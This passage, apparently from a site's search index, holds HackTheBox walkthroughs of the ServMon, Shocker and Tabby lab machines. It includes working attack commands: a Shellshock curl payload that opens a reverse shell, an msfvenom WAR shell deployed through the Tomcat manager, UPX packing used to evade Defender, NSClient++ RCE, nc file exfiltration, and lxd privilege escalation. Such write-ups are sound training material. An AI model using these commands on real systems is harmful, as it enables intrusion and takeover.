Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== <snip> Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 1m21s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-09T06:03:58 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 204.91 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/ServMon/index.html#microsoft-ftpd-21","text":"Port 21 is ftpd service allowed anonymous access. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:21.2]~/walkthrough/hackthebox/servmon \u2514\u2500$ ftp 10.10.10.184 Connected to 10.10.10.184. 220 Microsoft FTP Service Name (10.10.10.184:kali): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. I access to ftp server. This folder contain 2 Users Nadine and Nathan . ftp> ls Users 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:06PM <DIR> Nadine 01-18-20 12:08PM <DIR> Nathan 226 Transfer complete. Checking Nadine folder, I got Confidential.txt file. Poc code here ftp> ls Nadine 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:08PM 174 Confidential.txt 226 Transfer complete. Download file Confidential.txt and this is a mail from Nadine. The important info is Passwords.txt file on your Desktop . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:21.1]~/walkthrough/hackthebox/servmon \u2514\u2500$ cat Confidential.txt Nathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine Checking Nathan folder, I got Notes to do.txt file. Poc code here ftp> ls Nathan 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:10PM 186 Notes to do.txt 226 Transfer complete. File Notes to do.txt said that, Admin complete change password for NVMS and lock down access to NSClient. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:21.1]~/walkthrough/hackthebox/servmon \u2514\u2500$ cat Notes\\ to\\ do.txt 1) Change the password for NVMS - Complete 2) Lock down the NSClient Access - Complete 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint","title":"Microsoft ftpd 21"},{"location":"walkthrough/hackthebox/ServMon/index.html#nvms-1000-80","text":"The home page is NVMS 1000 . Searching public exploit using searchsploit . \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.0:22.5]~/walkthrough/hackthebox/servmon \u2514\u2500$ searchsploit nvms 1000 ------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------ --------------------------------- NVMS 1000 - Directory Traversal | hardware/webapps/47774.txt TVT NVMS 1000 - Directory Traversal | hardware/webapps/48311.py ------------------------------------------------------------ --------------------------------- Shellcodes: No Results Follow exploit hardware/webapps/47774.txt , I use BurpSuite to sent Traversal payload and got the contain of file windows/win.ini Poc code here","title":"NVMS 1000 80"},{"location":"walkthrough/hackthebox/ServMon/index.html#server-message-block","text":"Enum SMB service at port 139 and 445, But server is not allow access. ### SMB Enumeration (445) ############################ smbmap -H 10.10.10.184 -u guest [!] Authentication error on 10.10.10.184 smbclient -L 10.10.10.184 session setup failed: NT_STATUS_ACCESS_DENIED","title":"Server Message Block"},{"location":"walkthrough/hackthebox/ServMon/index.html#nsclient-8443","text":"The home page is NSClient++ . Searching public exploit using searchsploit . I got 2 exploit. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.5:37.1]~/walkthrough/hackthebox/servmon \u2514\u2500$ searchsploit NSClient ------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------ --------------------------------- NSClient++ 0.5.2.35 - Authenticated Remote Code Execution | json/webapps/48360.txt NSClient++ 0.5.2.35 - Privilege Escalation | windows/local/46802.txt ------------------------------------------------------------ --------------------------------- Shellcodes: No Results","title":"NSClient++ 8443"},{"location":"walkthrough/hackthebox/ServMon/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/ServMon/index.html#direc-travel-ssh-credential","text":"Poc code here At port 21, I know that User Nadine left file Password.txt at User Nathan's Desktop folder. Full directory is Users/Nathan/Desktop/Passwords.txt . Using NVMS 1000 - Directory Traversal hardware/webapps/47774.txt at port 80, I add directory of Password.txt to read it. I have a list of password, let's save it to file and using hydra to brute force in ssh service. First, with user nathan, there is no password found. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.8:35.8]~/walkthrough/hackthebox/servmon \u2514\u2500$ hydra -l nathan -P Password.txt 10.10.10.184 -t 4 ssh <snip> [DATA] attacking ssh://10.10.10.184:22/ 1 of 1 target completed, 0 valid password found <snip> Second, I try list password with user nadine and the password L1k3B1gBut7s@W0rk was found. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.8:35.7]~/walkthrough/hackthebox/servmon \u2514\u2500$ hydra -l nadine -P Password.txt 10.10.10.184 -t 4 ssh <snip> [DATA] attacking ssh://10.10.10.184:22/ [22][ssh] host: 10.10.10.184 login: nadine password: L1k3B1gBut7s@W0rk 1 of 1 target successfully completed, 1 valid password found <snip> SSH to server using knowed credential 'nadine:L1k3B1gBut7s@W0rk', I got user access. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.8:35.8]~/walkthrough/hackthebox/servmon \u2514\u2500$ ssh nadine@10.10.10.184 nadine@10.10.10.184's password: Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. nadine@SERVMON C:\\Users\\Nadine>whoami servmon\\nadine","title":"Direc Travel SSH Credential"},{"location":"walkthrough/hackthebox/ServMon/index.html#privilege-escalation","text":"Follow exploit NSClient++ 0.5.2.35 - Authenticated Remote Code Execution windows/local/46802.txt Poc code here Grab web administrator password open c:\\program files\\nsclient++\\nsclient.ini or run the following that is instructed when you select forget password nadine@SERVMON c:\\Temp>cd \"C:\\Program Files\\NSClient++\" nadine@SERVMON C:\\Program Files\\NSClient++>nscp web -- password --display Current password: ew2x6SsGTxjRwXOT Login and enable following modules including enable at startup and save configuration - CheckExternalScripts - Scheduler I login to NSClient with password ew2x6SsGTxjRwXOT but I still got 403. At Notes to do.txt , I confirmed that admin was lock down access to NSClient from public nerwork.","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/ServMon/index.html#ssh-local-port-forwarding","text":"Using SSH local port forwarding to connect NSClient from localhost. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[4.4:35.9]~/walkthrough/hackthebox/servmon \u2514\u2500$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 nadine@10.10.10.184's password: Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. nadine@SERVMON C:\\Users\\Nadine> Access to NSClient at https://127.0.0.1:8443/index.html#/settings . I saw the External Script and Scheduler was enabled. Download nc.exe and shell.bat to c:\\temp from attacking machine Next step, I sent file nc.exe to Windows machine, but this file cannot execute and will be delete after downloading. An anti-virus have been installed. Poc code here nadine@SERVMON C:\\Users\\Nadine>cd c:\\temp nadine@SERVMON c:\\Temp>powershell wget 10.10.14.4/nc.exe -outfile nc.exe nadine@SERVMON c:\\Temp>nc.exe The system cannot execute the specified program.","title":"SSH Local Port Forwarding"},{"location":"walkthrough/hackthebox/ServMon/index.html#simple-bypass-defender","text":"Simple packed file nc.exe with UPX. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.4:36.9]~/walkthrough/hackthebox/servmon \u2514\u2500$ upx -9 nc.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX 3.96 Markus Oberhumer, Laszlo Molnar & John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 59392 -> 29696 50.00% win32/pe nc.exe Packed 1 file. Download file nc.exe again and try to execute it. Now, I can run nc.exe to create reverse shell later. nadine@SERVMON c:\\Temp>powershell wget 10.10.14.4/nc.exe -outfile nc.exe nadine@SERVMON c:\\Temp>nc.exe Cmd line: Download file shell.bat nadine@SERVMON c:\\Temp>powershell wget 10.10.14.4/shell.bat -outfile shell.bat nadine@SERVMON c:\\Temp>shell.bat Setup listener on attacking machine After run file shell.bat, I got reverse shell to confirm this work, let's do final step to get admin shell. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.4:36.9]~/walkthrough/hackthebox/servmon \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.184] 49681 Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. nadine@SERVMON c:\\Temp>","title":"Simple Bypass Defender"},{"location":"walkthrough/hackthebox/ServMon/index.html#nsclient-script-exploitation","text":"Using exploit json/webapps/48360.txt in python file 48360.py and run it with knowed info. Poc code here \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[3.5:41.0]~/walkthrough/hackthebox/servmon \u2514\u2500$ python 48360.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'c:\\Temp\\shell.bat' [!] Targeting base URL https://127.0.0.1:8443 [!] Obtaining Authentication Token . . . [+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ [!] Enabling External Scripts Module . . . [!] Configuring Script with Specified Payload . . . [+] Added External Script (name: OQvYiexxJhGMF) [!] Saving Configuration . . . [!] Reloading Application . . . [!] Waiting for Application to reload . . . [!] Obtaining Authentication Token . . . [+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ [!] Triggering payload, should execute shortly . . . [!] Timeout exceeded. Assuming your payload executed . . . After wait a long time, I have system shell in the listener. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[3.8:37.7]~ \u2514\u2500$ sudo nc -nvlp 443 connect to [10.10.14.4] from (UNKNOWN) [10.10.10.184] 51227 Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Program Files\\NSClient++>whoami whoami nt authority\\system C:\\Program Files\\NSClient++>","title":"NSClient Script Exploitation"},{"location":"walkthrough/hackthebox/Shocker/index.html","text":"HackTheBox Shocker Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.56 [+] Openning ports: 80,2222 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.56 -p80,2222 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 23:48 +07 Nmap scan report for 10.10.10.56 Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds Apache httpd 2.4.18 It is so funny at the home page, but don't have value info here. List of the hidden in the server with wfuzz. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.4:26.0]~ \u2514\u2500$ wfuzz -z file,/usr/share/dirb/wordlists/common.txt --hc 404 'http://10.10.10.56/FUZZ' <snip> 000000820: 403 11 L 32 W 294 Ch \"cgi-bin/\" 000002020: 200 9 L 13 W 137 Ch \"index.html\" 000003588: 403 11 L 32 W 299 Ch \"server-status\" There are uri /cgi-bin/ may have more hidden content and will be exploit with shellshock vulnerability. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[4.9:27.2]~ \u2514\u2500$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php,.sh,.html -b 403,404 -q /user.sh (Status: 200) [Size: 118] I found uri user.sh in directory cgi-bin . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[4.9:26.2]~ \u2514\u2500$ curl http://10.10.10.56/cgi-bin/user.sh Content-Type: text/plain Just an uptime test script 13:55:03 up 1:11, 0 users, load average: 0.00, 0.00, 0.00 Foothold Shellshock Poc code here Shellshock CVE-2014-6271 Poc here . env X='() { :; }; echo \"CVE-2014-6271 vulnerable\"' bash -c id Execute shelshock payload in the server using curl. curl -H \"user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" http://10.10.10.56/cgi-bin/user.sh At the listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[3.4:26.2]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.56] 41484 bash: no job control in this shell shelly@Shocker:/usr/lib/cgi-bin$ whoami whoami shelly Privilege Escalation Sudo group Checking with sudo -l , I know that command /usr/bin/perl can run as root without require password. shelly@Shocker:/tmp$ sudo -l Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl Create file reverse shell rev.pl and execute it using sudo /usr/bin/perl . shelly@Shocker:/tmp$ cat rev.pl | sudo /usr/bin/perl At listener I have root shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[3.5:25.3]~/scripting/priescal \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.56] 41492 # id uid=0(root) gid=0(root) groups=0(root)","title":"HTB Shocker"},{"location":"walkthrough/hackthebox/Shocker/index.html#hackthebox-shocker","text":"Author: Hades Scripting here","title":"HackTheBox Shocker"},{"location":"walkthrough/hackthebox/Shocker/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Shocker/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.56 [+] Openning ports: 80,2222 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.56 -p80,2222 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 23:48 +07 Nmap scan report for 10.10.10.56 Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Shocker/index.html#apache-httpd-2418","text":"It is so funny at the home page, but don't have value info here. List of the hidden in the server with wfuzz. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.4:26.0]~ \u2514\u2500$ wfuzz -z file,/usr/share/dirb/wordlists/common.txt --hc 404 'http://10.10.10.56/FUZZ' <snip> 000000820: 403 11 L 32 W 294 Ch \"cgi-bin/\" 000002020: 200 9 L 13 W 137 Ch \"index.html\" 000003588: 403 11 L 32 W 299 Ch \"server-status\" There are uri /cgi-bin/ may have more hidden content and will be exploit with shellshock vulnerability. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[4.9:27.2]~ \u2514\u2500$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php,.sh,.html -b 403,404 -q /user.sh (Status: 200) [Size: 118] I found uri user.sh in directory cgi-bin . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[4.9:26.2]~ \u2514\u2500$ curl http://10.10.10.56/cgi-bin/user.sh Content-Type: text/plain Just an uptime test script 13:55:03 up 1:11, 0 users, load average: 0.00, 0.00, 0.00","title":"Apache httpd 2.4.18"},{"location":"walkthrough/hackthebox/Shocker/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Shocker/index.html#shellshock","text":"Poc code here Shellshock CVE-2014-6271 Poc here . env X='() { :; }; echo \"CVE-2014-6271 vulnerable\"' bash -c id Execute shelshock payload in the server using curl. curl -H \"user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" http://10.10.10.56/cgi-bin/user.sh At the listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[3.4:26.2]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.56] 41484 bash: no job control in this shell shelly@Shocker:/usr/lib/cgi-bin$ whoami whoami shelly","title":"Shellshock"},{"location":"walkthrough/hackthebox/Shocker/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Shocker/index.html#sudo-group","text":"Checking with sudo -l , I know that command /usr/bin/perl can run as root without require password. shelly@Shocker:/tmp$ sudo -l Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl Create file reverse shell rev.pl and execute it using sudo /usr/bin/perl . shelly@Shocker:/tmp$ cat rev.pl | sudo /usr/bin/perl At listener I have root shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[3.5:25.3]~/scripting/priescal \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.56] 41492 # id uid=0(root) gid=0(root) groups=0(root)","title":"Sudo group"},{"location":"walkthrough/hackthebox/Tabby/index.html","text":"HackTheBox Tabby Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.10.194 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 22,80,8080 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.194 -p22,80,8080 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 17:36 +07 Nmap scan report for 10.10.10.194 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA) | 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA) |_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds Apache httpd 2.4.41 At port 80, this is web application megahosting . At the All URLs of home page, I saw a link http://megahosting.htb/news.php?file=statement to get contain of file statement . ### Web Enumeration (80) ############################ [+] Header HTTP/1.1 200 OK Date: Thu, 08 Apr 2021 03:26:56 GMT Server: Apache/2.4.41 (Ubuntu) Content-Type: text/html; charset=UTF-8 [+] All URLs <title>Mega Hosting</title> <snip> <li><a href=\"http://megahosting.htb/news.php?file=statement\">News</a></li> <snip> But the url using domain megahosting.htb , I add this domain to file hosts. \u250c\u2500\u2500(root\ud83d\udc80kali)-[/home/kali/scripting] \u2514\u2500# echo '10.10.10.194 megahosting.htb' >> /etc/hosts Go to this url in the browser. Try to sent directory traversal payload to read system file and it works. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.4:23.2]~ \u2514\u2500$ curl 'http://megahosting.htb/news.php?file=../../../../../../../../etc/passwd' root:x:0:0:root:/root:/bin/bash <snip> ash:x:1000:1000:clive:/home/ash:/bin/bash Apache Tomcat 9 Poc code here At port 8080, it is tomcat 9 in a default page. I tried to guess some default credential for manager page, but I can't get in. But there is a directory traversal vulnerability in port 80, let's use it to find the credential for manager page. Foothold Path Travel to Tomcat Creds Poc code here I search location of file tomcat-users.xml and this is helpful File list of package tomcat9 . Using directory traversal vulberability at port 80 to read file tomcat-users.xml . I have credential tomcat:$3cureP4s5w0rd123! with role admin-gui and manager-script . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:27.1]~/scripting \u2514\u2500$ curl 'http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml' <snip> --> <role rolename=\"admin-gui\"/> <role rolename=\"manager-script\"/> <user username=\"tomcat\" password=\"$3cureP4s5w0rd123!\" roles=\"admin-gui,manager-script\"/> </tomcat-users> Manager script deploy Poc code here Follow role of the knowed credential, I search for deploy shell with manager script and I found Deploy_A_New_Application_Archive_(WAR)_Remotely Deployt a war file at http://localhost:8080/manager/text/deploy?path=/foo This link tomcat manager deploy guide how to deploy with curl . curl --upload-file appplication-0.1-1.war \"http://tomcat:tomcat@localhost:8080/manager/deploy?path=/application-0.1-1 First, I create shell.war using msfvenom \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:29.1]~/walkthrough/hackthebox/tabby \u2514\u2500$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war > shell.war Payload size: 1100 bytes Final size of war file: 1100 bytes Using curl to upload shell file to server with knowed credential. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:29.2]~/walkthrough/hackthebox/tabby \u2514\u2500$ curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war 'http://megahosting.htb:8080/manager/text/deploy?path=/shell' OK - Deployed application at context path [/shell] Execute shell at url http://megahosting.htb:8080/shell/ . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:30.1]~/walkthrough/hackthebox/tabby \u2514\u2500$ curl http://megahosting.htb:8080/shell/ At listener, I have reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:29.2]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.194] 54320 id uid=997(tomcat) gid=997(tomcat) groups=997(tomcat) Privilege Escalation Zip Password Cracking Poc code here After do some local enum in the server, I found a backup file at /var/www/html/files tomcat@tabby:/var/www/html$ ls assets favicon.ico files index.php logo.png news.php Readme.txt tomcat@tabby:/var/www/html$ cd files tomcat@tabby:/var/www/html/files$ ls 16162020_backup.zip archive revoked_certs statement tomcat@tabby:/var/www/html/files$ nc -nv 10.10.14.5 445 < 16162020_backup.zip 2021/04/08 04:16:19 CMD: UID=997 PID=62575 | nc -nv 10.10.14.5 445 Connection to 10.10.14.5 445 port [tcp/*] succeeded! Donwload file 16162020_backup.zip to kali machine using nc \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:33.0]~/walkthrough/hackthebox/tabby \u2514\u2500$ sudo nc -nvlp 445 > 16162020_backup.zip listening on [any] 445 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.194] 50276 This file require password to unzip. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:14.6]~/walkthrough/hackthebox/tabby \u2514\u2500$ unzip 16162020_backup.zip Archive: 16162020_backup.zip creating: var/www/html/assets/ [16162020_backup.zip] var/www/html/favicon.ico password: Let's using zip2john to get a hash of this file and crack it. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:31.2]~/walkthrough/hackthebox/tabby \u2514\u2500$ zip2john 16162020_backup.zip > hash Using directory rockyou.txt to crack file hash and I got the password admin@it \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:31.2]~/walkthrough/hackthebox/tabby \u2514\u2500$ john hash --wordlist=/home/kali/directory/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status admin@it (16162020_backup.zip) 1g 0:00:00:01 DONE (2021-04-08 11:05) 0.6944g/s 7196Kp/s 7196Kc/s 7196KC/s adnc153..adenabuck Use the \"--show\" option to display all of the cracked passwords reliably Session completed Unzip this file but I don't have more info, this is only backup file for the web application. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:31.3]~/walkthrough/hackthebox/tabby \u2514\u2500$ unzip 16162020_backup.zip Archive: 16162020_backup.zip creating: var/www/html/assets/ [16162020_backup.zip] var/www/html/favicon.ico password: inflating: var/www/html/favicon.ico creating: var/www/html/files/ inflating: var/www/html/index.php extracting: var/www/html/logo.png inflating: var/www/html/news.php inflating: var/www/html/Readme.txt In the other way, I try to login to user ash with some knowed password $3cureP4s5w0rd123! and admin@it . With password admin@it , I got user permission. tomcat@tabby:/home$ ls ash tomcat@tabby:/home$ su ash Password: ash@tabby:/home$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) lxd/lxc mount file Poc code here Checking user ash, this user in lxd/lxc group ash@tabby:/tmp$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) At lxd/lxc Group - Privilege escalation , I can follow it to get root #Install requirements sudo apt update sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools #Clone repo sudo go get -d -v github.com/lxc/distrobuilder #Make distrobuilder cd $HOME/go/src/github.com/lxc/distrobuilder Make install with root account in kali machine \u250c\u2500\u2500(root\ud83d\udc80kali)-[~/go/src/github.com/lxc/distrobuilder] \u2514\u2500# make gofmt -s -w . go install -v ./... go: downloading gopkg.in/yaml.v2 v2.4.0 <snip> distrobuilder built successfully #Prepare the creation of alpine mkdir -p $HOME/ContainerImages/alpine/ cd $HOME/ContainerImages/alpine/ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml Build file lxd with distrobuilder \u250c\u2500\u2500(root\ud83d\udc80kali)-[~/ContainerImages/alpine] \u2514\u2500# /root/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8 <snip> \u250c\u2500\u2500(root\ud83d\udc80kali)-[~/ContainerImages/alpine] \u2514\u2500# ls alpine.yaml lxd.tar.xz rootfs.squashfs When I deploy file lxd.tar.xz while using reverse shell, I got error No such file or directory for file lxd.tar.xz . Let's add authorized_keys to server and using ssh with private key. Deploy image again and it work. ash@tabby:/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine Image imported with fingerprint: 344c9cfe47fc1c5ff64a553087b3e11649aa40dd47dc074b56488a700479f3bf ash@tabby:/tmp$ lxc image list +--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE | +--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+ | alpine | 344c9cfe47fc | no | Alpinelinux 3.8 x86_64 (20210408_0521) | x86_64 | CONTAINER | 1.92MB | Apr 8, 2021 at 5:49am (UTC) | +--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+ Get error while create comtainer. ash@tabby:/tmp$ lxc init alpine privesc -c security.privileged=true Creating privesc Error: No storage pool found. Please create a new storage pool Search error with google and I have to init before create container ash@tabby:/tmp$ lxd init <snip> Create container again and it work ash@tabby:/tmp$ lxc init alpine privesc -c security.privileged=true Creating privesc ash@tabby:/tmp$ lxc list +---------+---------+------+------+-----------+-----------+ | NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS | +---------+---------+------+------+-----------+-----------+ | privesc | STOPPED | | | CONTAINER | 0 | +---------+---------+------+------+-----------+-----------+ Mount container privesc with path /mnt/root to source from Tabby / . Go to check /mnt/root and I got file root.txt ash@tabby:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true Device host-root added to privesc ash@tabby:/tmp$ lxc start privesc ash@tabby:/tmp$ lxc exec privesc /bin/sh ~ # cd /mnt/root /mnt/root # ls bin cdrom etc lib lib64 lost+found mnt proc run snap swap.img tmp var boot dev home lib32 libx32 media opt root sbin srv sys usr /mnt/root # cat root/root.txt ba2c48cc39dd91fdd4bc355dfa033265","title":"HTB Tabby"},{"location":"walkthrough/hackthebox/Tabby/index.html#hackthebox-tabby","text":"Author: Hades Scripting here","title":"HackTheBox Tabby"},{"location":"walkthrough/hackthebox/Tabby/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Tabby/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.10.194 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 22,80,8080 ### Services Enumeration ############################ nmap -sC -sV 